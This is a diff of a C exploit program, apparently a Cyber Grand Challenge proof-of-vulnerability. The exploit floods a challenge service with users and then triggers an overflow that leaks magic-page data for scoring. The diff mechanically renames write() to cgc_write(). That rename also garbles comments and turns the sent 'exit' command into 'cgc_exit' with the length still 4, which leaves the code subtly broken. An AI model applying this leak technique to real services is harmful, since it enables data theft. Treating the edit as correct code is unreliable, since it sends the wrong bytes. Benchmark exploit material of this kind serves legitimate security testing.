@@ -78,7 +78,7 @@ unsigned int postID;
 	// negotiate a type 2 POV
 	pov_type = 2;
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
+	if (cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
 		_terminate(-1);
 
 	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
@@ -107,7 +107,7 @@ unsigned int postID;
 
 
 	// send the message to add the user
-	write(STDOUT, (void *)buffer, 151);
+	cgc_write(STDOUT, (void *)buffer, 151);
 
 	receive_bytes(STDIN, &retcode, 4);
 
@@ -119,13 +119,13 @@ unsigned int postID;
 
 	buffer[12] = 1;
 
-	// now add a bunch of users to move the read pointer of the file mapped to the magic page towards the end
+	// now add a bunch of users to move the cgc_read pointer of the file mapped to the magic page towards the end
 	for (i = 0; i < 180; ++i ) {
 
 		sprintf(buffer+7, "$03d", i);
 		buffer[10] = 1;
 
-		write(STDOUT, (void *)buffer, 14);
+		cgc_write(STDOUT, (void *)buffer, 14);
 
 		receive_bytes(STDIN, &retcode, 4);
 
@@ -146,7 +146,7 @@ unsigned int postID;
 	buffer[10] = 1;
 
 	// send the message to login the user
-	write(STDOUT, (void *)buffer, 12);
+	cgc_write(STDOUT, (void *)buffer, 12);
 
 	// need to save the returned userCode for making posts
 	receive_bytes(STDIN, &userCode, 4);
@@ -162,7 +162,7 @@ unsigned int postID;
 	buffer[9] = 'a';
 
 	// send the message to make a post
-	write(STDOUT, (void *)buffer, 10);
+	cgc_write(STDOUT, (void *)buffer, 10);
 
 	// return code is the post's ID
 	receive_bytes(STDIN, &postID, 4);
@@ -177,14 +177,14 @@ unsigned int postID;
 	buffer[12] = 1;
 	buffer[13] = 'b';
 
-	write(STDOUT, (void *)buffer, 14);
+	cgc_write(STDOUT, (void *)buffer, 14);
 
 	// get the response to the comment
 	receive_bytes(STDIN, &retcode, 4);
 
 	if (retcode != 0 ) {
 
-		write(2, "comment error\n", 14);
+		cgc_write(2, "comment error\n", 14);
 	}
 
 	// now request the specific message to get its comments, which should cause the overflow
@@ -192,7 +192,7 @@ unsigned int postID;
 
 	*(unsigned int *)(buffer+4) = postID;
 
-	write(STDOUT, (void *)buffer, 8);
+	cgc_write(STDOUT, (void *)buffer, 8);
 
 
 	// receive the first part of the response
@@ -204,20 +204,20 @@ unsigned int postID;
 
 	if ( retcode == 0x8a ) {
 
-		write(2, "exploited", 9);
+		cgc_write(2, "exploited", 9);
 		receive_bytes(STDIN, buffer, 0x8a+5+8+8);
 		receive_bytes(STDIN, buffer, 54);
 	}
 	else {
 
-		write(2, "patched binary\n", 15);
+		cgc_write(2, "patched binary\n", 15);
 	}
 
-	// now write the returned data back to the POV server for scoring
-	write(3, buffer+50, 4);
+	// now cgc_write the returned data back to the POV server for scoring
+	cgc_write(3, buffer+50, 4);
 
-	// send the command to exit the CB
-	write(STDOUT, "exit", 4);
+	// send the command to cgc_exit the CB
+	cgc_write(STDOUT, "cgc_exit", 4);
 
 }
 
